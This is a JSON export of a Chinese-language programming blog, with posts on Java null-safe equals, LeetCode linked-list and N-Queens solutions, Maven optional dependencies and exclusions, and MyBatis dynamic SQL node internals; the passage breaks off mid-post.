{"meta":{"title":"huskyui","subtitle":"","description":"","author":"huskyui","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"java常见BUG持续更新中","slug":"java常见BUG持续更新中","date":"2020-11-01T14:45:47.000Z","updated":"2020-11-14T17:10:28.302Z","comments":true,"path":"2020/11/01/java常见BUG持续更新中/","link":"","permalink":"http://yoursite.com/2020/11/01/java%E5%B8%B8%E8%A7%81BUG%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/","excerpt":"","text":"String类型的equalsString a = 未知；// 不知是null还是字符串 String b = &quot;abc&quot;; // 下面写法空指针异常 // String a = null; // String b = &quot;abc&quot;; // System.out.println(a.equals(b)); // 我们应该这么写 String a = null; String b = &quot;abc&quot;; System.out.println(b.equals(a)); //这有什么区别呢。 // 下面是String.equals方法 public boolean equals(Object anObject) { if (this == anObject) { return true; } if (anObject instanceof String) { String anotherString = (String)anObject; int n = value.length; if (n == anotherString.value.length) { char v1[] = value; char v2[] = anotherString.value; int i = 0; while (n-- != 0) { if (v1[i] != v2[i]) return false; i++; } return true; } } return false; }结论 我们在比较字符串的时候，需要明确一个不会为空的值，放在左边去equals未知的值 List list中使用remove()今天晚上，写leetcode的时候，发现使用remove方法时，结果一直出错 如果传入给remove的值的时候，你要明确是传的是int还是Integer,这两个是不同的方法，需要明确","categories":[],"tags":[{"name":"Java学习","slug":"Java学习","permalink":"http://yoursite.com/tags/Java%E5%AD%A6%E4%B9%A0/"},{"name":"java","slug":"java","permalink":"http://yoursite.com/tags/java/"}]},{"title":"leetcode-234回文链表","slug":"leetcode-234回文链表","date":"2020-10-25T15:33:26.000Z","updated":"2020-11-14T17:10:30.399Z","comments":true,"path":"2020/10/25/leetcode-234回文链表/","link":"","permalink":"http://yoursite.com/2020/10/25/leetcode-234%E5%9B%9E%E6%96%87%E9%93%BE%E8%A1%A8/","excerpt":"","text":"本题重要点 反转链表 快慢指针，一个二倍速，一个一倍速，可以获取一个链表的中间节点 1-&gt;2-&gt;3-4-&gt;null =&gt; 3-&gt;4-&gt;null 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;null =&gt; 3-&gt;4-&gt;5-&gt;null 后半段反转后，依次和总的链表进行比较，如果不同就false,这里就是一个长链表和一个短链表的对比了，大可不必担心，这个链表是奇数还是偶数 //请判断一个链表是否为回文链表。 // // 示例 1: // // 输入: 1-&gt;2 //输出: false // // 示例 2: // // 输入: 1-&gt;2-&gt;2-&gt;1 //输出: true // // // 进阶： //你能否用 O(n) 时间复杂度和 O(1) 空间复杂度解决此题？ // Related Topics 链表 双指针 // 👍 744 👎 0 //leetcode submit region begin(Prohibit modification and deletion) /** * Definition for singly-linked list. * public class ListNode { * int val; * ListNode next; * ListNode(int x) { val = x; } * } */ class Solution { public ListNode reverseList(ListNode head) { ListNode curr = null; ListNode pre = head; while (pre != null) { ListNode tempNode = pre.next; pre.next = curr; curr = pre; pre = tempNode; } return curr; } public ListNode getHalfNode(ListNode head) { ListNode fast = head; ListNode low = head; while (fast != null &amp;&amp; fast.next != null) { fast = fast.next.next; low = low.next; } return low; } public boolean isPalindrome(ListNode head) { ListNode temp = head; ListNode half = getHalfNode(temp); ListNode reverseList = reverseList(half); ListNode p = head; ListNode q = reverseList; while (q != null) { if (p.val != q.val) { return false; } p = p.next; q = q.next; } return true; } } //leetcode submit region end(Prohibit modification and deletion)","categories":[],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://yoursite.com/tags/leetcode/"}]},{"title":"maven optional dependencies and dependency exclusions","slug":"maven optional dependencies and dependency exclusions","date":"2020-10-21T17:18:48.000Z","updated":"2020-11-14T17:10:30.923Z","comments":true,"path":"2020/10/22/maven optional dependencies and dependency exclusions/","link":"","permalink":"http://yoursite.com/2020/10/22/maven%20optional%20dependencies%20and%20dependency%20exclusions/","excerpt":"","text":"开篇最近看到mybatis的pom文件里面的dependency都多了一个选项optional. 发现了项目中引入mybatis的依赖，但并没有将mybatis的依赖传递过来。下面以图为证 &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.3&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt;下面输出 mvn dependency:tree [INFO] --- maven-dependency-plugin:2.8:tree (default-cli) @ mvn-excluede-demo --- [INFO] com.example:mvn-excluede-demo:jar:1.0-SNAPSHOT [INFO] +- junit:junit:jar:4.11:test [INFO] | \\- org.hamcrest:hamcrest-core:jar:1.3:test [INFO] \\- org.mybatis:mybatis:jar:3.5.3:compile那我们来看看mybatis中的pom文件是如何写的 只举一部分例子 &lt;dependency&gt; &lt;groupId&gt;commons-logging&lt;/groupId&gt; &lt;artifactId&gt;commons-logging&lt;/artifactId&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cglib&lt;/groupId&gt; &lt;artifactId&gt;cglib&lt;/artifactId&gt; &lt;version&gt;3.2.10&lt;/version&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt;可以看到通过 &lt;optional&gt;true&lt;/optioal&gt; optional标签How do optional dependencies work?Project-A -&gt; Project-BThe diagram above says that Project-A depends on Project-B. When A declares Bas an optional dependency in its POM, this relationship remains unchanged.It’s just like a normal build where Project-B will be added in Project-A’sclasspath. Project-X -&gt; Project-AWhen another project (Project-X) declares Project-A as a dependency in itsPOM, the optional nature of the dependency takes effect. Project-B is notincluded in the classpath of Project-X. You need to declare it directly in thePOM of Project X for B to be included in X’s classpath. 上面是官网对于optional的解读，上面的举例就是projectA使用了projectB作为Optional(可选的)依赖，如何A打包作为X的依赖，projectB不会包含在projectX的classpath中。如果需要使用projectB,需要你显式的引用projectB的依赖。 ExampleSuppose there is a project named X2 that has similar functionality toHibernate . It supports many databases such as MySQL, PostgreSQL, andseveral versions of Oracle. Each supported database requires an additionaldependency on a driver jar. All of these dependencies are needed at compiletime to build X2. However your project only uses one specific database anddoesn’t need drivers for the others. X2 can declare these dependencies asoptional, so that when your project declares X2 as a direct dependency in itsPOM, all the drivers supported by the X2 are not automatically included inyour project’s classpath. Your project will have to include an explicitdependency on the specific driver for the one database it does use. 假定如果有一个项目X2和Hibernate类似。它支持多个databases例如mysql,PostgreSQL和多个版本的Oracle.每一个支持的数据库都需要一个额外的依赖在驱动jar包上。在构建x2的时候需要这些。然而你的项目在使用时，你只使用一个特定的数据库而不需要其他的，X2可以申明这些依赖为可选的。你项目在使用时，需要一个明确的依赖来特定的驱动。 exclusion如何依赖是如下形式的 Project-A -&gt; Project-B -&gt; Project-D &lt;! -- This dependency should be excluded --&gt; -&gt; Project-E -&gt; Project-F -&gt; Project C如果projectA 依赖于ProjectB和ProjectC,projectB是依赖于E和F 所以ProjectA会依赖B、C、D、E、F 如果你想要ProjectD将其加入到ProjectA的classPath中。项目B的开发者可以标致ProjectD的optional为true。 手动排除当前层级的但是很不幸的，他们并没有 ，所以你需要在ProjectA的pom文件中，手动去排除 &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;sample.ProjectB&lt;/groupId&gt; &lt;artifactId&gt;Project-B&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;sample.ProjectD&lt;/groupId&gt; &lt;!-- Exclude Project-D from Project-B --&gt; &lt;artifactId&gt;Project-D&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;/dependencies&gt;依赖中的排除那一个层级消失，不会传递给下一个依赖如果有一个项目X依赖于ProjectA,那么ProjectD是否会被exclude 答案是正确的。会被exclude 依赖并不是全局的，有点局部变量的味道如果项目X同时又依赖于ProjectY，projectY里面依赖于ProjectD，这是ProjectD并不会被全局的exclude，他是projectY的合法依赖。 下面，我们来看看 英文原文 If you deploy Project-A to a repository, and Project-X declares a normal dependency on Project-A, will Project-D still be excluded from the classpath? Project-X -&gt; Project-A The answer is Yes. Project-A has declared that it doesn&apos;t need Project-D to run, so it won&apos;t be brought in as a transitive dependency of Project-A. Now, consider that Project-X depends on Project-Y, as in the diagram below: Project-X -&gt; Project-Y -&gt; Project-B -&gt; Project-D ... Project-Y also has a dependency on Project-B, and it does need the features supported by Project-D. Therefore, it will NOT place an exclusion on Project-D in its dependency list. It may also supply an additional repository, from which it can resolve Project-E. In this case, it&apos;s important that Project-D is not excluded globally, since it is a legitimate dependency of Project-Y.排除跨层级的如果想要在ProjectB中排除E &lt;dependency&gt; &lt;groupId&gt;sample.ProjectB&lt;/groupId&gt; &lt;artifactId&gt;Project-B&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;sample.ProjectE&lt;/groupId&gt; &lt;!-- Exclude Project-E from Project-B --&gt; &lt;artifactId&gt;Project-E&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt;参考资料: https://maven.apache.org/guides/introduction/introduction-to-optional-and-excludes-dependencies.html https://cloud.tencent.com/developer/article/1028070","categories":[],"tags":[{"name":"maven","slug":"maven","permalink":"http://yoursite.com/tags/maven/"}]},{"title":"leetode 52 N皇后","slug":"leetode 52 N皇后","date":"2020-10-19T16:17:21.000Z","updated":"2020-11-14T17:10:31.441Z","comments":true,"path":"2020/10/20/leetode 52 N皇后/","link":"","permalink":"http://yoursite.com/2020/10/20/leetode%2052%20N%E7%9A%87%E5%90%8E/","excerpt":"","text":"思考1.对于回溯算法，和之前的生成括号是一样的，不要想着自己用for循环去解决这个问题，而是需要用递归解决。2.要注意到的是，在递归时，不要用java的list这种传递，最好用int[][]类型属性来传递。3.这一题有个限制条件，①皇后数目（当最后一个棋子已经下完）②横竖，斜线，这个斜线有点恶心的地方是是45°和135°都要考虑。 //n 皇后问题研究的是如何将 n 个皇后放置在 n×n 的棋盘上，并且使皇后彼此之间不能相互攻击。 // // // // 上图为 8 皇后问题的一种解法。 // // 给定一个整数 n，返回 n 皇后不同的解决方案的数量。 // // 示例: // // 输入: 4 //输出: 2 //解释: 4 皇后问题存在如下两个不同的解法。 //[ // [&quot;.Q..&quot;, // 解法 1 // &quot;...Q&quot;, // &quot;Q...&quot;, // &quot;..Q.&quot;], // // [&quot;..Q.&quot;, // 解法 2 // &quot;Q...&quot;, // &quot;...Q&quot;, // &quot;.Q..&quot;] //] // // // // // 提示： // // // 皇后，是国际象棋中的棋子，意味着国王的妻子。皇后只做一件事，那就是“吃子”。当她遇见可以吃的棋子时，就迅速冲上去吃掉棋子。当然，她横、竖、斜都可走一或 N //-1 步，可进可退。（引用自 百度百科 - 皇后 ） // // Related Topics 回溯算法 // 👍 181 👎 0 //leetcode submit region begin(Prohibit modification and deletion) class Solution { int total = 0; public int totalNQueens(int n) { char[][] array = new char[n][n]; build(0, 0, n, array, &apos;.&apos;, 0); build(0, 0, n, array, &apos;Q&apos;, 1); return total; } public void build(int x, int y, int n, char[][] oneResult, char currentCh, int queueCount) { if (x &gt;= n || y &gt;= n) { return; } if (currentCh == &apos;Q&apos;) { // // 右下方斜线 int tempY = y - 1; int tempX = x - 1; while (tempX &gt;= 0 &amp;&amp; tempY &gt;= 0) { if (oneResult[tempX][tempY] == currentCh) { return; } tempY--; tempX--; } // 左上方斜线 tempX = x - 1; tempY = y + 1; while (tempX &lt;= n - 1 &amp;&amp; tempY &gt;= 0 &amp;&amp; tempX &gt;= 0 &amp;&amp; tempY &lt;= n - 1) { if (oneResult[tempX][tempY] == currentCh) { return; } tempX--; tempY++; } // 横线 for (int p = 0; p &lt; y; p++) { if (oneResult[x][p] == currentCh) { return; } } // 竖线 for (int p = 0; p &lt; x; p++) { if (oneResult[p][y] == currentCh) { return; } } } oneResult[x][y] = currentCh; if (x == n - 1 &amp;&amp; y == n - 1) { if (queueCount == n) { total+=1; } return; } if (y == n - 1) { build(x + 1, 0, n, oneResult, &apos;Q&apos;, queueCount + 1); build(x + 1, 0, n, oneResult, &apos;.&apos;, queueCount); } else { build(x, y + 1, n, oneResult, &apos;Q&apos;, queueCount + 1); build(x, y + 1, n, oneResult, &apos;.&apos;, queueCount); } } } //leetcode submit region end(Prohibit modification and deletion)","categories":[],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://yoursite.com/tags/leetcode/"}]},{"title":"mybatis中sqlNode","slug":"mybatis中sqlNode","date":"2020-10-16T16:29:38.000Z","updated":"2020-11-14T17:10:32.070Z","comments":true,"path":"2020/10/17/mybatis中sqlNode/","link":"","permalink":"http://yoursite.com/2020/10/17/mybatis%E4%B8%ADsqlNode/","excerpt":"","text":"mybatis中sqlNodeTextSqlNodeHashMap&lt;String,String&gt; parameterObject = new HashMap&lt;&gt;(); parameterObject.put(&quot;id&quot;,&quot;123&quot;); parameterObject.put(&quot;name&quot;,&quot;huskyui&quot;); TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from blog where id = #{id} and name = ${name}&quot;); SqlNode mixedSqlNode = new MixedSqlNode(Arrays.asList(textSqlNode)); DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),mixedSqlNode); BoundSql boundSql = dynamicSqlSource.getBoundSql(parameterObject); System.out.println(boundSql.getSql()); // 这句话最后输出的结果是 // select * from blog where id = ? and name = huskyui // 使用dynamicSqlSource.getBoundSql时，会调用mixedSqlNode的apply方法。而mixedSqlNode会foreach调用构造参数里面的Arrays.asList // (textSqlNode)的apply方法,会触发对${}进行解析，并替换下面我们来模拟一个解析的 // TextSqlNode里面的对${}进行解析，下面就是一个大概实例，实际中使用到了OgnlCache GenericTokenParser tokenParser = new GenericTokenParser(&quot;${&quot;, &quot;}&quot;, new TokenHandler() { @Override // 这个方法主要针对${context},对context进行处理 public String handleToken(String content) { HashMap&lt;String,String&gt; map = new HashMap&lt;&gt;(); map.put(&quot;name&quot;,&quot;huskyui&quot;); return map.get(content); } }); String parsedText = tokenParser.parse(&quot;select * from blog where name = ${name}&quot;); System.out.println(parsedText);#{参数名}最终解析出来的 ？ 是用于java原生自带的 PreparedStatement 这种方式来进行,防止 sql注入 当然，我们也需要注意到的一点是${}是会直接进行替换的，这里就会出现上面可能出现的 sql注入 问题 参考： https://www.cnblogs.com/question-sky/p/7569405.html IfSqlNode在xml中出现的方式有多种，我们举个最简单的例子 select * from user WHERE 1 = 1 &lt;if test=&quot;phone != null and phone != &apos;&apos;&quot;&gt; AND phone = #{phone} &lt;/if&gt;最终解析为 HashMap&lt;String,Object&gt; propertyMap = new HashMap&lt;&gt;(); propertyMap.put(&quot;phone&quot;,&quot;110&quot;); TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from user\\n&quot; + &quot; WHERE 1 = 1&quot;); IfSqlNode ifSqlNode = new IfSqlNode(new TextSqlNode(&quot;AND phone = #{phone}&quot;),&quot;phone != null and phone != &apos;&apos;&quot;); SqlNode mixedSqlNode = new MixedSqlNode(Arrays.asList(textSqlNode,ifSqlNode)); DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),mixedSqlNode); System.out.println(dynamicSqlSource.getBoundSql(propertyMap).getSql());解释 在调用IfSqlNode的apply方法时，会调用自身封装的Ognl处理 &quot;phone != null and phone != &#39;&#39;&quot;这段语句，如果为true，则调用TextSqlNode里面的apply方法，解析${}并将解析完的语句append到结果上面去。 我当时一直在想，这个test里面的值，到底是如何处理的，难道是mybatis自己写的解析，最终发现了这个项目引进了 ognl . 不重复造轮子，站在巨人的肩膀上。 那么，我们就来模拟出一个ognl是如何实现对这个解析的 OgnlContext context = new OgnlContext(null,null,new DefaultMemberAccess(true)); Map&lt;String,Object&gt; propertyMap = new HashMap&lt;&gt;(); propertyMap.put(&quot;phone&quot;,&quot;110&quot;); System.out.println(Ognl.getValue(&quot;phone!=null and phone != &apos;&apos;&quot;, context, propertyMap));ChooseSqlNodeSELECT * FROM BLOG WHERE state = ‘ACTIVE’ &lt;choose&gt; &lt;when test=&quot;title != null&quot;&gt; AND title like #{title} &lt;/when&gt; &lt;when test=&quot;author != null and author.name != null&quot;&gt; AND author_name like #{author.name} &lt;/when&gt; &lt;otherwise&gt; AND featured = 1 &lt;/otherwise&gt; &lt;/choose&gt;大概解析为，并不相符，我只是举个例子，由于在工作中很少用到这个choose HashMap&lt;String,Object&gt; propertyMap = new HashMap&lt;&gt;(); // propertyMap.put(&quot;id&quot;,1); // propertyMap.put(&quot;name&quot;,&quot;huskyui&quot;); TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from blog where 1 = 1&quot;); List&lt;SqlNode&gt; ifNodeList = new ArrayList&lt;&gt;(); ifNodeList.add(new IfSqlNode(new TextSqlNode(&quot;and name = #{name}&quot;),&quot;name != null and name != &apos;&apos;&quot;)); ifNodeList.add(new IfSqlNode(new TextSqlNode(&quot;and id = #{id}&quot;),&quot;id != null and id != &apos;&apos;&quot;)); TextSqlNode defaultSqlNode = new TextSqlNode(&quot;and id &gt; 0&quot;); ChooseSqlNode chooseSqlNode = new ChooseSqlNode(ifNodeList,defaultSqlNode); MixedSqlNode mixedSqlNode = new MixedSqlNode(Arrays.asList(textSqlNode,chooseSqlNode)); DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),mixedSqlNode); System.out.println(dynamicSqlSource.getBoundSql(propertyMap).getSql());chooseSqlNode有点像java中的switch-case,但不是全像(chooseSqlNode不能多个条件执行同一个)。我们来看一下ChooseSqlNode里面的apply方法 @Override public boolean apply(DynamicContext context) { for (SqlNode sqlNode : ifSqlNodes) { if (sqlNode.apply(context)) { return true; } } if (defaultSqlNode != null) { defaultSqlNode.apply(context); return true; } return false; }代码写的很清楚，一看就懂 TrimSqlNode我们先讲解TrimSqlNode,然后再讲解WhereSqlNode和SetSqlNode &lt;select id=&quot;selectSome&quot;&gt; select * from blog &lt;trim prefix=&quot;where&quot; prefixOverrides=&quot;and|or&quot;&gt; &lt;if test=&quot;name!=null&quot;&gt; and `name` = #{name} &lt;/if&gt; &lt;if test=&quot;age!=null&quot;&gt; and age =#{age} &lt;/if&gt; &lt;/trim&gt; &lt;/select&gt; TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from blog&quot;); IfSqlNode ifSqlNode1 = new IfSqlNode(new TextSqlNode(&quot;and name = #{name} &quot;),&quot;true&quot;); IfSqlNode ifSqlNode2 = new IfSqlNode(new TextSqlNode(&quot;and age = #{age}&quot;),&quot;true&quot;); MixedSqlNode mixedSqlNode = new MixedSqlNode(Arrays.asList(ifSqlNode1,ifSqlNode2)); TrimSqlNode trimSqlNode = new TrimSqlNode(new Configuration(),mixedSqlNode,&quot;where&quot;,&quot;and|or&quot;,null,null); DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),new MixedSqlNode(Arrays.asList(textSqlNode,trimSqlNode))); System.out.println(dynamicSqlSource.getBoundSql(null).getSql());我们来看看 TrimSqlNode 的构造参数 public TrimSqlNode(Configuration configuration, SqlNode contents, String prefix, String prefixesToOverride, String suffix, String suffixesToOverride) { this(configuration, contents, prefix, parseOverrides(prefixesToOverride), suffix, parseOverrides(suffixesToOverride)); }此处会将 prefixesToOveride 字符串进行根据 | 分割 查看 apply 方法 @Override public boolean apply(DynamicContext context) { FilteredDynamicContext filteredDynamicContext = new FilteredDynamicContext(context); // 此句执行，MixedSqlNode中apply方法，而apply方法就是forEach依次执行子的apply方法 // and name = #{name} and age = #{age} // 生成这样的 boolean result = contents.apply(filteredDynamicContext); // 这句话会对上面这句话进行解析，举例上面的，去除语句前面的and|or,然后加上where,当然只是加上了前缀解析 filteredDynamicContext.applyAll(); return result; }WhereSqlNodeWhereSqlNode 本质上是基础了TrimSqlNode。我们就来品品他的构造参数 private static List&lt;String&gt; prefixList = Arrays.asList(&quot;AND &quot;,&quot;OR &quot;,&quot;AND\\n&quot;, &quot;OR\\n&quot;, &quot;AND\\r&quot;, &quot;OR\\r&quot;, &quot;AND\\t&quot;, &quot;OR\\t&quot;); public WhereSqlNode(Configuration configuration, SqlNode contents) { super(configuration, contents, &quot;WHERE&quot;, prefixList, null, null); } &lt;select id=&quot;findActiveBlogLike&quot; resultType=&quot;Blog&quot;&gt; SELECT * FROM BLOG &lt;where&gt; &lt;if test=&quot;state != null&quot;&gt; state = #{state} &lt;/if&gt; &lt;if test=&quot;title != null&quot;&gt; AND title like #{title} &lt;/if&gt; &lt;if test=&quot;author != null and author.name != null&quot;&gt; AND author_name like #{author.name} &lt;/if&gt; &lt;/where&gt; &lt;/select&gt;SetSqlNode&lt;update id=&quot;updateAuthorIfNecessary&quot;&gt; update Author &lt;set&gt; &lt;if test=&quot;username != null&quot;&gt;username=#{username},&lt;/if&gt; &lt;if test=&quot;password != null&quot;&gt;password=#{password},&lt;/if&gt; &lt;if test=&quot;email != null&quot;&gt;email=#{email},&lt;/if&gt; &lt;if test=&quot;bio != null&quot;&gt;bio=#{bio}&lt;/if&gt; &lt;/set&gt; where id=#{id} &lt;/update&gt;SetSqlNode 构造参数 private static final List&lt;String&gt; COMMA = Collections.singletonList(&quot;,&quot;); public SetSqlNode(Configuration configuration,SqlNode contents) { super(configuration, contents, &quot;SET&quot;, COMMA, null, COMMA); }解释：去除拼接好后的语句 username= ? ,password= ? ,email= ? ,bio= ? 去除前后的 , ，并在前加上set ，后不加 ForeachSqlNode&lt;select id=&quot;selectPostIn&quot; resultType=&quot;domain.blog.Post&quot;&gt; SELECT * FROM POST P WHERE ID in &lt;foreach item=&quot;item&quot; index=&quot;index&quot; collection=&quot;list&quot; open=&quot;(&quot; separator=&quot;,&quot; close=&quot;)&quot;&gt; #{item} &lt;/foreach&gt; &lt;/select&gt;上面这句话如果正常的话，会解析成 select * from blog where id in ( ? , ? , ? , ? , ? , ? ) Map&lt;String,Object&gt; properties = new HashMap&lt;&gt;(); properties.put(&quot;list&quot;,Arrays.asList(1,2,3,4,5,6)); TextSqlNode textSqlNode = new TextSqlNode(&quot;select * from blog where id in &quot;); ForEachSqlNode forEachSqlNode = new ForEachSqlNode(new Configuration(),new TextSqlNode(&quot;#{item}&quot;) ,&quot;list&quot;,&quot;index&quot;,&quot;item&quot;,&quot;(&quot;,&quot;)&quot;,&quot;,&quot;); DynamicSqlSource dynamicSqlSource = new DynamicSqlSource(new Configuration(),new MixedSqlNode(Arrays.asList(textSqlNode,forEachSqlNode))); System.out.println(dynamicSqlSource.getBoundSql(properties).getSql());我们就来看看这个ForEachNode的apply方法是如何实现的 @Override public boolean apply(DynamicContext context) { Map&lt;String, Object&gt; bindings = context.getBindings(); // 通过Ognl.getValue来判断当前是否是可以迭代的 final Iterable&lt;?&gt; iterable = evaluator.evaluateIterable(collectionExpression, bindings); // 如果是不可以迭代的，那么就此结束 if (!iterable.iterator().hasNext()) { return true; } // 标志位 boolean first = true; // 在sql语句中先加入open applyOpen(context); int i = 0; for (Object o : iterable) { DynamicContext oldContext = context; if (first || separator == null) { context = new PrefixedContext(context, &quot;&quot;); } else { context = new PrefixedContext(context, separator); } // 为了index而准备的。就是一个累加器。从0开始 int uniqueNumber = context.getUniqueNumber(); // Issue #709 // 如果是map类型的 if (o instanceof Map.Entry) { @SuppressWarnings(&quot;unchecked&quot;) Map.Entry&lt;Object, Object&gt; mapEntry = (Map.Entry&lt;Object, Object&gt;) o; //key做为index。 applyIndex(context, mapEntry.getKey(), uniqueNumber); applyItem(context, mapEntry.getValue(), uniqueNumber); } else { // 否则就是collection，key是下标 applyIndex(context, i, uniqueNumber); applyItem(context, o, uniqueNumber); } // 这个地方调用的是TextSqlNode的apply方法，apply方法里面调用了FiltedDynamicContext的appendSql方法 contents.apply(new FilteredDynamicContext(configuration, context, index, item, uniqueNumber)); if (first) { first = !((PrefixedContext) context).isPrefixApplied(); } context = oldContext; i++; } // 在末尾加上close applyClose(context); context.getBindings().remove(item); context.getBindings().remove(index); return true; }最终会生成 select * from blog where id in ( #{__frch_item_0} , #{__frch_item_1} , #{__frch_item_2} , #{__frch_item_3} , #{__frch_item_4} , #{__frch_item_5} ) 在调用DynamicSqlSource调用getBoundSql会将#{}替换成？","categories":[],"tags":[{"name":"mybatis","slug":"mybatis","permalink":"http://yoursite.com/tags/mybatis/"},{"name":"orm","slug":"orm","permalink":"http://yoursite.com/tags/orm/"}]},{"title":"leetcode-24两两交换链表中的节点","slug":"leetcode-24两两交换链表中的节点","date":"2020-10-13T15:21:11.000Z","updated":"2020-11-14T17:10:32.575Z","comments":true,"path":"2020/10/13/leetcode-24两两交换链表中的节点/","link":"","permalink":"http://yoursite.com/2020/10/13/leetcode-24%E4%B8%A4%E4%B8%A4%E4%BA%A4%E6%8D%A2%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E8%8A%82%E7%82%B9/","excerpt":"","text":"//给定一个链表，两两交换其中相邻的节点，并返回交换后的链表。 // // 你不能只是单纯的改变节点内部的值，而是需要实际的进行节点交换。 // // // // 示例: // // 给定 1-&gt;2-&gt;3-&gt;4, 你应该返回 2-&gt;1-&gt;4-&gt;3. // // Related Topics 链表 // 👍 676 👎 0 //leetcode submit region begin(Prohibit modification and deletion) /** * Definition for singly-linked list. * public class ListNode { * int val; * ListNode next; * ListNode() {} * ListNode(int val) { this.val = val; } * ListNode(int val, ListNode next) { this.val = val; this.next = next; } * } */ class Solution { public ListNode swapPairs(ListNode head) { ListNode root = new ListNode(-1); root.next = head; ListNode pre = root; if(head == null||head.next==null){ return head; } ListNode p = head; ListNode q = head.next; while (p != null &amp;&amp; q != null) { pre.next = q; p.next = q.next; q.next = p; pre = pre.next.next; if( pre == null||pre.next==null){ break; }else{ p = pre.next; q = pre.next.next; } } return root.next; } } //leetcode submit region end(Prohibit modification and deletion)","categories":[],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://yoursite.com/tags/leetcode/"}]},{"title":"leetcode142-环形链表","slug":"leetcode142-环形链表","date":"2020-10-12T14:32:59.000Z","updated":"2020-11-14T17:10:33.062Z","comments":true,"path":"2020/10/12/leetcode142-环形链表/","link":"","permalink":"http://yoursite.com/2020/10/12/leetcode142-%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/","excerpt":"","text":"//给定一个链表，返回链表开始入环的第一个节点。 如果链表无环，则返回 null。 // // 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。注意，po //s 仅仅是用于标识环的情况，并不会作为参数传递到函数中。 // // 说明：不允许修改给定的链表。 // // 进阶： // // // 你是否可以不用额外空间解决此题？ // // // // // 示例 1： // // // // //输入：head = [3,2,0,-4], pos = 1 //输出：返回索引为 1 的链表节点 //解释：链表中有一个环，其尾部连接到第二个节点。 // // // 示例 2： // // // // //输入：head = [1,2], pos = 0 //输出：返回索引为 0 的链表节点 //解释：链表中有一个环，其尾部连接到第一个节点。 // // // 示例 3： // // // // //输入：head = [1], pos = -1 //输出：返回 null //解释：链表中没有环。 // // // // // 提示： // // // 链表中节点的数目范围在范围 [0, 104] 内 // -105 &lt;= Node.val &lt;= 105 // pos 的值为 -1 或者链表中的一个有效索引 // // Related Topics 链表 双指针 // 👍 719 👎 0 //leetcode submit region begin(Prohibit modification and deletion) /** * Definition for singly-linked list. * class ListNode { * int val; * ListNode next; * ListNode(int x) { * val = x; * next = null; * } * } */ public class Solution { public ListNode detectCycle(ListNode head) { if (head == null || head.next == null) { return null; } ListNode low = head.next; ListNode fast = head.next.next; while (low!=null) { if (fast == null || fast.next == null) { return null; } if(low == fast){ ListNode newTravel = head; while (newTravel!=low){ low = low.next; newTravel = newTravel.next; } return low; } low = low.next; fast = fast.next.next; } return null; } } //leetcode submit region end(Prohibit modification and deletion)","categories":[],"tags":[{"name":"leetcode","slug":"leetcode","permalink":"http://yoursite.com/tags/leetcode/"}]},{"title":"leetcode-141环形链表","slug":"leetcode-141环形链表","date":"2020-10-11T04:35:24.000Z","updated":"2020-11-14T17:10:33.604Z","comments":true,"path":"2020/10/11/leetcode-141环形链表/","link":"","permalink":"http://yoursite.com/2020/10/11/leetcode-141%E7%8E%AF%E5%BD%A2%E9%93%BE%E8%A1%A8/","excerpt":"","text":"//给定一个链表，判断链表中是否有环。 // // 如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的 //位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。注意：pos 不作为参数进行传递，仅仅是为了标识链表的实际情况。 // // 如果链表中存在环，则返回 true 。 否则，返回 false 。 // // // // 进阶： // // 你能用 O(1)（即，常量）内存解决此问题吗？ // // // // 示例 1： // // // // 输入：head = [3,2,0,-4], pos = 1 //输出：true //解释：链表中有一个环，其尾部连接到第二个节点。 // // // 示例 2： // // // // 输入：head = [1,2], pos = 0 //输出：true //解释：链表中有一个环，其尾部连接到第一个节点。 // // // 示例 3： // // // // 输入：head = [1], pos = -1 //输出：false //解释：链表中没有环。 // // // // // 提示： // // // 链表中节点的数目范围是 [0, 104] // -105 &lt;= Node.val &lt;= 105 // pos 为 -1 或者链表中的一个 有效索引 。 // // Related Topics 链表 双指针 // 👍 820 👎 0 //leetcode submit region begin(Prohibit modification and deletion) import java.util.HashSet; import java.util.Set; /** * Definition for singly-linked list. * class ListNode { * int val; * 